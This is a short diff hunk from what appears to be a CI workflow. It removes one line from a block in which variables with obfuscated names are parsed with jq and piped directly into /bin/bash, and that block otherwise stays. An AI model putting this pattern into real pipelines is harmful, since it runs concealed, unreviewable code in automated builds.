@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$d67149" | jq -r .bb32620 | /bin/bash
           printf '%s' "$lqiet006" | jq -r .oi27 | /bin/bash
           echo $w599 | jq -r .j43 | /bin/bash
-          printf '%s' "$j720" | jq -r .igjig63 | /bin/bash
           echo $f19107 | jq -r .pw888 | /bin/bash
 
       - name: Store results
